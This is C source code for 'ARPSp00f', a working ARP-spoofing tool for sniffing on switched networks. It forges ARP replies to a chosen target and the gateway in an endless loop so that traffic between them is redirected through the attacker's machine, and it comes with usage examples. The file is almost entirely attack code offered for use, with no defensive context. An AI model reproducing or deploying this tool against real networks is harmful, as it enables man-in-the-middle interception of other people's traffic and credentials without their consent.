/*
 * ARPSp00f v0.1 - switched network sniffing
 * -----------------------------------------
 *
 * This simple program will help you to sniff on switched networks. Thanks to 
 * Senko Rasic on his ARP server (good layer 2 socket programming example).
 * BTW: You don't need libnet for this program.
 *
 * Usage:         ./arpspoof <interface> <gateway_ip> <sniff_target_ip> <target_hw>
 * Usage example: ./arpspoof  eth0 192.168.0.1 11:11:11:11:11:11 192.168.0.2 31:33:73:13:37:31
 *
 * - This example will redirect all network traffic between 192.168.0.2 and 192.168.0.1 
 *   to our machine. 
 *   11:11:11:11:11:11 is MAC address of gateway host (182.168.0.1).
 *   31:33:73:13:37:31 is MAC address of target host (192.168.0.2). 
 *   To obtain gateway and target MAC address, just `ping` them and check arp table (arp -a). 
 *   ARP reply packets will be sent every 10 seconds to update arp cache.
 *  
 *   Coded by DownBload <downbload@hotmail.com> / Illegal Instruction Labs <www.ii-labs.org>
 *
*/ 
 
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <features.h>    /* for the glibc version number */
#if __GLIBC__ >= 2 && __GLIBC_MINOR >= 1
#include <netpacket/packet.h>
#include <net/ethernet.h>     /* the L2 protocols */
#else
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>   /* The L2 protocols */
#endif

#define ARPHRD_ETHER    1   
#define ARPOP_REPLY     2    

#define ARP_CACHE_UPDATE 10


struct ether_header
{
	u_int8_t  ether_dhost[ETH_ALEN];      /* destination eth addr */
	u_int8_t  ether_shost[ETH_ALEN];      /* source ether addr    */
	u_int16_t ether_type;                 /* packet type ID field */
} __attribute__ ((packed));


struct arphdr {
	unsigned short int ar_hrd;          /* Format of hardware address.  */
	unsigned short int ar_pro;          /* Format of protocol address.  */
	unsigned char ar_hln;               /* Length of hardware address.  */
	unsigned char ar_pln;               /* Length of protocol address.  */
	unsigned short int ar_op;           /* ARP opcode (command).  */
	unsigned char __ar_sha[6];          /* Sender hardware address.  */
	unsigned char __ar_sip[4];          /* Sender IP address.  */
	unsigned char __ar_tha[6];          /* Target hardware address.  */
	unsigned char __ar_tip[4];          /* Target IP address.  */
} __attribute__ ((packed)); 


struct eth_arp {
	struct ether_header eth;
	struct arphdr arp;
} eth_arp;


char tmpg[64];




void fill_header (char* dstEth, char *srcip, char *dstip)
{
	unsigned char *ptr;
	struct in_addr a,b;

	ascii_to_hwaddr (dstEth);
	
	memcpy (eth_arp.eth.ether_dhost, tmpg, 6);
	memcpy (eth_arp.arp.__ar_tha, tmpg, 6);


        eth_arp.eth.ether_type =  htons(ETH_P_ARP);
	eth_arp.arp.ar_hrd =  htons(ARPHRD_ETHER); 
	eth_arp.arp.ar_pro =  htons(ETH_P_IP);
	eth_arp.arp.ar_hln =  6;
	eth_arp.arp.ar_pln =  4;
	eth_arp.arp.ar_op =  htons(ARPOP_REPLY);

	b.s_addr = inet_addr(dstip);
	a.s_addr = inet_addr(srcip);

	memcpy (&eth_arp.arp.__ar_sip, (unsigned char*)&a.s_addr, 4) ;
	memcpy (&eth_arp.arp.__ar_tip, (unsigned char*)&b.s_addr, 4);
}	



	
int send_packet (char *interface)
{
	struct ifreq ifr;
	struct sockaddr_ll sock;
	int fd, tmpfd, x;
	char buf[512];

	tmpfd = socket (AF_INET, SOCK_DGRAM, 0);
	strncpy (ifr.ifr_name, interface, IFNAMSIZ);
	ioctl (tmpfd, SIOCGIFINDEX, &ifr);          // get interface index
	sock.sll_ifindex    = ifr.ifr_ifindex;      // set it in sock struct 
	
	ioctl (tmpfd, SIOCGIFHWADDR, &ifr);                   // get interface addr
	memcpy (sock.sll_addr, ifr.ifr_hwaddr.sa_data, 6);   // set it in sock struct	
 	
	memcpy (eth_arp.eth.ether_shost, ifr.ifr_hwaddr.sa_data, 6);  // fill header src
	memcpy (eth_arp.arp.__ar_sha, ifr.ifr_hwaddr.sa_data, 6);     // fill header src
			
	sock.sll_family   = AF_PACKET;
	sock.sll_protocol = htons(ETH_P_ALL);
	sock.sll_hatype   = ARPHRD_ETHER;
	sock.sll_halen = 6;
	close (tmpfd);

	if ((fd = socket (PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
		perror("socket:");
		exit(-1);
	}
	x = sizeof (struct sockaddr_ll);
	memcpy (buf,&eth_arp,sizeof(struct eth_arp));
	if ((sendto (fd, buf, sizeof (struct eth_arp), 0, (struct sockaddr*)&sock, x)) == -1) {
	   perror("sendto:");
	   exit(-1);
	}
	close (fd);
}


	

unsigned short atohex (char *hex) // lame :)
{
	short int x,y,a,a2=0;
	char buf[2];

	char nums[] = {"0123456789abcdef"};

	memcpy (buf,hex,2);	
	for (x=0;x<2;x++) {
	    for (y=0;y<16;y++) {
		if (buf[x] == nums[y]) {
	            if (x == 0) a = (y) * 16;   
		    else a = y;
	            a2 +=a;
	   	}
	    }
	}
	return a2;
}
	    



void ascii_to_hwaddr (unsigned char *hwaddr)
{
	unsigned char buf[6], t[2];
	unsigned short a, x, y=0;
	
	do {     
	    t[0] = *hwaddr++;	
	    t[1] = *hwaddr++;
	    hwaddr++; 
	    a = atohex (t);
	    buf[y] = a;
	    y++;
	} while (y < 6);
	memcpy (tmpg, buf, 6);
}




main (int argc, char **argv)
{

	printf ("[----------------------------------------------]\n"
		"[] ARPSp00f v0.2 - switched network sniffing  []\n"
		"[] coded by DownBload <downbload@hotmail.com> []\n"
	        "[----------------------------------------------]-\n");
        if (argc != 6) { 
	   printf ("Usage: %s <interface> <gateway_ip> <gateway_hw> <target_ip> <target_hw>\n"
		   "Example: %s eth0 192.168.0.1 11:11:11:11:11:11 192.168.0.2 31:33:73:13:37:31\n",argv[0],argv[0]);
	   exit (-1);
	}

	
        printf ("Intercept all traffic between:\n%s (MAC: %s) and %s (MAC: %s) on %s device\n",argv[2], 
	       argv[3], argv[4], argv[5], argv[1]);
	       	       
        while (1) {
	     printf ("* Update ARP cache on target and gateway -> ");
	     fill_header (argv[5],argv[2],argv[4]);   // spoof ARP from gateway to target
	     send_packet (argv[1]);
	
	     fill_header (argv[3], argv[4], argv[2]); // spoof ARP from target to gateway
	     send_packet (argv[1]);
	     sleep (ARP_CACHE_UPDATE);    // send packets every n seconds for ARP cache update
	     printf ("DONE\n");
	}
}	 
	    
    				    
	
